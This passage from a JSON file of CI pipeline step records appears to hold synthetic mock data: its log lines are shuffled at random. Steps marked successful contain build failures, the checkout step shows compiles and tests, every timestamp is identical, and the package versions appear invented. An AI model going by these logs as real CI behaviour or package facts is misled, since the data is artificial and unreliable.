          "Artifact uploaded: build.tar.gz (9MB)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Cache hit for key-9155",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Cache hit for key-2305",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (148ms)",
          "Step 6/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@2.20.0",
          "Step 1/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Installing axios@5.1.0",
          "Cache hit for key-7164",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-10T12:00:34.564161",
        "finished_at": "2025-12-10T12:00:44.343809",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "  PASS: test_cache_hit (399ms)",
          "Cache hit for key-8498",
          "  PASS: test_cache_hit (158ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_cache_hit (333ms)",
          "  PASS: test_user_create (305ms)",
          "Step 3/10: Building",
          "Cache hit for key-8793",
          "Cache hit for key-5637",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing react@2.20.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 build completed",
          "  PASS: test_auth_login (178ms)",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-5808",
          "Step 9/10: Building",
          "Cache hit for key-4313",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Installing lodash@5.13.0",
          "  PASS: test_cache_hit (366ms)",
          "Step 2/10: Building",
          "Installing webpack@3.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (353ms)",
          "Installing express@1.3.0",
          "Installing webpack@1.3.0",
          "  PASS: test_db_connect (227ms)",
          "  PASS: test_db_connect (338ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 5/10: Building",
          "Cache hit for key-1107",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "  PASS: test_auth_login (44ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (331ms)",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/10: Building",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_db_connect (306ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 1/10: Building",
          "Cache hit for key-2841",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (85ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5678",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing jest@2.11.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 6/10: Building",
          "  PASS: test_db_connect (311ms)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "\u2713 build completed",
          "  PASS: test_cache_hit (432ms)",
          "  PASS: test_cache_hit (417ms)",
          "Installing react@1.5.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8474",
          "Installing express@2.6.0",
          "Cache hit for key-3597",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (288ms)",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing webpack@5.12.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_db_connect (426ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing jest@2.14.0",
          "Installing prettier@3.10.0",
          "Installing webpack@5.13.0",
          "Cache hit for key-5885",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@5.14.0",
          "  PASS: test_cache_hit (434ms)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Cache hit for key-7837",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@5.1.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6281",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "FAILED: test_auth_login",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-1076",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (431ms)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (409ms)",
          "Installing jest@3.0.0",
          "Compiling src/utils.go...",
          "Cache hit for key-4855",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3132",
          "\u2713 test completed",
          "Installing webpack@5.10.0",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-8359",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (337ms)",
          "  PASS: test_api_health (149ms)",
          "Cache hit for key-7413",
          "  PASS: test_api_health (279ms)",
          "Installing eslint@4.14.0",
          "  PASS: test_api_health (389ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_auth_login (248ms)",
          "\u2713 build completed",
          "Cache hit for key-4139",
          "Installing jest@5.15.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2780",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (174ms)",
          "Cache hit for key-1663",
          "Installing jest@1.11.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-10T12:00:44.343809",
        "finished_at": "2025-12-10T12:00:54.123457",
        "log_lines": [
          "=== Step: type_check ===",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "Installing react@5.7.0",
          "Installing lodash@5.18.0",
          "Installing webpack@1.1.0",
          "Installing lodash@4.3.0",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (101ms)",
          "\u2713 build completed",
          "Cache hit for key-5196",
          "  PASS: test_cache_hit (492ms)",
          "\u2713 lint completed",
          "Installing axios@3.0.0",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing prettier@5.9.0",
          "Cache hit for key-5775",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Installing react@3.10.0",
          "[12:00:18] INFO: Processing request",
          "FAILED: test_user_create",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.11.0",
          "  PASS: test_cache_hit (87ms)",
          "  PASS: test_auth_login (145ms)",
          "Cache hit for key-3441",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9942",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "\u2713 build completed",
          "Cache hit for key-6377",
          "Step 1/10: Building",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "  PASS: test_auth_login (63ms)",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-8153",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "FAILED: test_auth_login",
          "Installing webpack@2.15.0",
          "Installing prettier@1.18.0",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (26ms)",
          "\u2713 test completed",
          "Cache hit for key-5009",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (499ms)",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_cache_hit (427ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "  PASS: test_user_create (17ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (35ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-5900",
          "Installing lodash@2.11.0",
          "Installing webpack@3.10.0",
          "Cache hit for key-7518",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Installing jest@2.5.0",
          "Installing webpack@3.20.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (317ms)",
          "Installing jest@2.7.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "Cache hit for key-2728",
          "Step 10/10: Building",
          "  PASS: test_db_connect (130ms)",
          "Step 9/10: Building",
          "Installing react@1.20.0",
          "Installing jest@3.13.0",
          "Installing lodash@4.20.0",
          "Installing react@1.18.0",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1527",
          "  PASS: test_db_connect (286ms)",
          "  PASS: test_user_create (130ms)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Installing express@4.17.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 8/10: Building",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (34ms)",
          "Cache hit for key-6305",
          "Installing express@2.14.0",
          "WARNING: express has known vulnerabilities",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Step 1/10: Building",
          "Installing react@5.12.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_api_health (211ms)",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_cache_hit (181ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing express@1.4.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing webpack@4.9.0",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Cache hit for key-8303",
          "Compiling src/utils.go...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-10T12:00:54.123457",
        "finished_at": "2025-12-10T12:00:59.991246",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Installing eslint@2.2.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8323",
          "\u2717 build failed with exit code 90",
          "Installing react@3.0.0",
          "  PASS: test_db_connect (97ms)",
          "Installing eslint@1.3.0",
          "Cache hit for key-1479",
          "  PASS: test_cache_hit (312ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8014",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5778",
          "Compiling src/handler.rs...",
          "Cache hit for key-1068",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 test completed",
          "Cache hit for key-2218",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-2076",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (46ms)",
          "Step 2/10: Building",
          "Cache hit for key-6762",
          "  PASS: test_user_create (180ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_api_health (124ms)",
          "Step 9/10: Building",
          "Cache hit for key-6029",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_cache_hit (158ms)",
          "  PASS: test_auth_login (427ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2717 build failed with exit code 42",
          "Installing prettier@1.16.0",
          "  PASS: test_api_health (293ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 72",
          "\u2717 build failed with exit code 5",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing jest@2.16.0",
          "  PASS: test_api_health (153ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_user_create (446ms)",
          "Installing webpack@1.0.0",
          "Installing lodash@2.2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2817",
          "Cache hit for key-6259",
          "Compiling src/app.ts...",
          "Installing react@3.13.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-5151",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_api_health (94ms)",
          "Installing webpack@4.19.0",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Installing axios@5.1.0",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@5.16.0",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Cache hit for key-3368",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Installing jest@3.11.0",
          "Installing express@5.4.0",
          "Cache hit for key-9922",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-6839",
          "Installing axios@3.17.0",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "Cache hit for key-1084",
          "Step 2/10: Building",
          "  PASS: test_api_health (246ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2764",
          "FAILED: test_auth_login",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@2.5.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "Installing jest@1.7.0",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-9456",
          "  PASS: test_auth_login (255ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-7587",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing react@5.3.0",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@4.4.0",
          "[12:00:18] INFO: Processing request",
          "\u2717 build failed with exit code 56",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Cache hit for key-6526",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-2710",
          "  PASS: test_api_health (307ms)",
          "Installing express@4.1.0",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "Installing webpack@4.1.0",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Installing react@5.10.0",
          "Cache hit for key-3943",
          "  PASS: test_cache_hit (103ms)",
          "  PASS: test_api_health (253ms)",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2717 build failed with exit code 93",
          "\u2713 lint completed",
          "Cache hit for key-2222",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-10T12:00:59.991246",
        "finished_at": "2025-12-10T12:01:29.330191",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Exception: ValueError",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Exception: ValueError",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Exception: ValueError",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (307ms)",
          "  PASS: test_auth_login (474ms)",
          "  PASS: test_db_connect (79ms)",
          "Cache hit for key-6704",
          "Step 5/10: Building",
          "  PASS: test_api_health (240ms)",
          "Installing webpack@4.15.0",
          "Step 1/10: Building",
          "Step 9/10: Building",
          "  PASS: test_api_health (270ms)",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "Installing webpack@4.18.0",
          "Cache hit for key-3154",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-4392",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Installing eslint@1.2.0",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_api_health (186ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 5/10: Building",
          "Cache hit for key-5989",
          "  PASS: test_cache_hit (40ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/service.java...",
          "Installing eslint@5.4.0",
          "Cache hit for key-6112",
          "Compiling src/index.js...",
          "  PASS: test_user_create (403ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (180ms)",
          "Installing prettier@3.2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (333ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (2ms)",
          "Installing express@3.2.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (284ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (412ms)",
          "Cache hit for key-7054",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 5/10: Building",
          "  PASS: test_db_connect (252ms)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (486ms)",
          "Compiling src/index.js...",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (480ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing express@4.18.0",
          "  PASS: test_cache_hit (311ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (336ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Installing eslint@3.13.0",
          "  PASS: test_api_health (181ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/app.ts...",
          "WARNING: axios has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (311ms)",
          "Installing eslint@3.7.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (208ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/main.py...",
          "Cache hit for key-3713",
          "  PASS: test_cache_hit (236ms)",
          "  PASS: test_auth_login (404ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing webpack@1.9.0",
          "Cache hit for key-6841",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (320ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/index.js...",
          "Cache hit for key-4174",
          "  PASS: test_db_connect (71ms)",
          "Compiling src/utils.go...",
          "Installing webpack@4.14.0",
          "Installing eslint@1.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Installing react@2.1.0",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@2.8.0",
          "Cache hit for key-6801",
          "Step 5/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-5352",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (265ms)",
          "Compiling src/main.py...",
          "Cache hit for key-9905",
          "Installing axios@4.16.0",
          "  PASS: test_api_health (499ms)",
          "Installing express@2.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@2.8.0",
          "\u2713 build completed",
          "Installing eslint@4.10.0",
          "Installing eslint@3.16.0",
          "Step 7/10: Building",
          "Installing lodash@3.15.0",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_cache_hit (88ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8750",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 91",
          "  PASS: test_cache_hit (252ms)",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@5.1.0",
          "  PASS: test_api_health (154ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-5897",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-10T12:01:29.330191",
        "finished_at": "2025-12-10T12:01:33.242050",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 build completed",
          "Cache hit for key-6097",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_db_connect (186ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-2017",
          "Step 2/10: Building",
          "Installing eslint@3.13.0",
          "\u2713 build completed",
          "Installing react@5.15.0",
          "  PASS: test_db_connect (286ms)",
          "  PASS: test_db_connect (88ms)",
          "Installing axios@3.18.0",
          "  PASS: test_user_create (20ms)",
          "Cache hit for key-2061",
          "Cache hit for key-9775",
          "Installing express@2.11.0",
          "Cache hit for key-6731",
          "Installing react@3.17.0",
          "Cache hit for key-7319",
          "Compiling src/index.js...",
          "Installing webpack@4.11.0",
          "Installing prettier@5.15.0",
          "[12:00:18] INFO: Processing request",
          "Installing axios@3.12.0",
          "Step 8/10: Building",
          "Compiling src/handler.rs...",
          "Installing express@5.2.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-4440",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-2584",
          "Cache hit for key-9226",
          "Installing react@4.4.0",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "Installing prettier@3.8.0",
          "Installing axios@1.17.0",
          "  PASS: test_auth_login (442ms)",
          "\u2713 test completed",
          "Cache hit for key-7518",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (421ms)",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-6828",
          "\u2713 test completed",
          "  PASS: test_user_create (205ms)",
          "  PASS: test_user_create (5ms)",
          "Cache hit for key-2000",
          "Cache hit for key-8113",
          "  PASS: test_api_health (388ms)",
          "  PASS: test_user_create (248ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 7/10: Building",
          "  PASS: test_user_create (258ms)",
          "Cache hit for key-8170",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-4068",
          "Cache hit for key-6913",
          "  PASS: test_cache_hit (54ms)",
          "Installing react@4.10.0",
          "Step 6/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2225",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Step 6/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing react@2.2.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Cache hit for key-3769",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "  PASS: test_api_health (363ms)",
          "\u2713 lint completed",
          "Exception: TypeError",
          "  PASS: test_api_health (151ms)",
          "  PASS: test_db_connect (359ms)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (251ms)",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4330",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "FAILED: test_cache_hit",
          "\u2717 build failed with exit code 114",
          "Compiling src/handler.rs...",
          "Cache hit for key-5663",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-1663",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/service.java...",
          "Cache hit for key-4777",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Cache hit for key-4531",
          "\u2713 test completed",
